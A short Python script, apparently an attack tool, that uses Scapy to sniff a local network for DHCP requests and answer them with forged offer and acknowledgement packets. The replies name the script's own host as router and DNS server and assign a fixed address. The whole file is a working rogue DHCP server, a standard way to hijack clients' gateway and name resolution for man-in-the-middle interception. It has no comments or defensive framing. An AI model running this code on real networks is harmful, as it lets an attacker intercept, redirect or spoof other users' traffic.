#!/usr/bin/python
from scapy.all import *
import uuid

def get_mac():
	return str(':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])).upper()

server_mac = get_mac()
server_ip = "192.168.1.201"

def dhcpMonitorCallBack(pkt):
	if pkt.haslayer(DHCP):
		if pkt[DHCP].options[0][1] == 1:
			packet = newDhcpOffer(pkt)
			sendp(packet)

		if pkt[DHCP].options[0][1] == 3:
			packet = newDhcpAkt(pkt)
			sendp(packet)

def newDhcpOffer(pkt):
    packet =  Ether(src=server_mac, dst = "FF:FF:FF:FF:FF:FF")/\
                IP(src = server_ip, dst = "255.255.255.255", flags = "DF")/\
                UDP(sport=67, dport=68)/\
                BOOTP( op=2, yiaddr = "192.168.1.8", siaddr=server_ip, giaddr=server_ip, chaddr=pkt[BOOTP].chaddr , xid=pkt[BOOTP].xid, flags = 0x0000)/\
                DHCP(options=[('message-type', 'offer'), ('subnet_mask', "255.255.255.0"), ('router', server_ip), ('name_server', server_ip), ('server_id', server_ip), ('renewal_time',1800), ('lease_time',3150), 'end'])
    print("DHCP Offer IP: "+ "192.168.1.8" + "-> MAC: " + pkt[Ether].src)
    return packet

def newDhcpAkt(pkt):
    packet =  Ether(src=server_mac, dst="FF:FF:FF:FF:FF:FF") /\
                IP(src=server_ip, dst="255.255.255.255", flags = "DF") /\
                UDP(sport=67, dport=68) /\
                BOOTP(op=2, yiaddr="192.168.1.8", siaddr=server_ip, giaddr=server_ip,chaddr=pkt[BOOTP].chaddr,xid=pkt[BOOTP].xid,flags=0x0000) /\
                DHCP(options=[('message-type', 'ack'),('subnet_mask', "255.255.255.0"),('router', server_ip),('name_server', server_ip),('server_id', server_ip),('renewal_time',1800),('lease_time',3150),'end'])
    print("DHCP ACK IP: "+ "192.168.1.8" + "-> MAC: " + pkt[Ether].src)
    return packet

sniff(prn=dhcpMonitorCallBack)
